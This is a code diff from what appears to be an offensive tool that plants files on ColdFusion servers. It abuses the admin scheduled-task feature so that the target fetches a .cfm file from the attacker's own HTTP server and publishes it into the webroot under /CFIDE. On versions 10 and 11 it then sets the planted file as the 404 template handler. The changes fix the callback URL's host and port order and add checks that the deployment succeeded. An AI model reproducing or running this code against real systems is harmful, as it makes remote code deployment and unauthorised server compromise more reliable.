@@ -51,13 +51,13 @@ def deploy(fingerengine, fingerprint):
 
     # invoke the task
     utility.Msg("Task %s created, invoking task..." % cfm_file)
-    run_task(dip, fingerprint, cfm_path)
+    success = run_task(dip, fingerprint, cfm_path)
 
     # remove the task
     utility.Msg("Cleaning up...")
     delete_task(dip, fingerprint, cfm_file)
 
-    if fingerprint.version in ["10.0", '11.0']:
+    if fingerprint.version in ["10.0", '11.0'] and success:
         # set the template 404 handler
         set_template(dip, fingerprint, root, cfm_file)
 
@@ -77,7 +77,7 @@ def create_task(ip, fingerprint, cfm_file, root):
             "StartTimeOnce" : "9:56 PM", # see above
             "Operation" : "HTTPRequest",
             "ScheduledURL" : "http://{0}:{1}/{2}".format(
-                    state.external_port,utility.local_address(), cfm_file),
+                    utility.local_address(), state.external_port, cfm_file),
             "publish" : "1",
             "publish_file" : root + "\\" + cfm_file, # slash on OS?
             "adminsubmit" : "Submit"
@@ -131,6 +131,7 @@ def run_task(ip, fingerprint, cfm_path):
     our file
     """
 
+    success = True
     cfm_name = parse_war_path(cfm_path, True)
         
     # kick up the HTTP server
@@ -153,8 +154,11 @@ def run_task(ip, fingerprint, cfm_path):
     response = utility.requests_get(url + uri, cookies=cookie)
     if waitServe(server_thread):
         utility.Msg("{0} deployed to /CFIDE/{0}".format(cfm_name), LOG.SUCCESS)
+    else:
+        success = False
 
     killServe()
+    return success
 
 
 def fetch_csrf(ip, fingerprint, url):
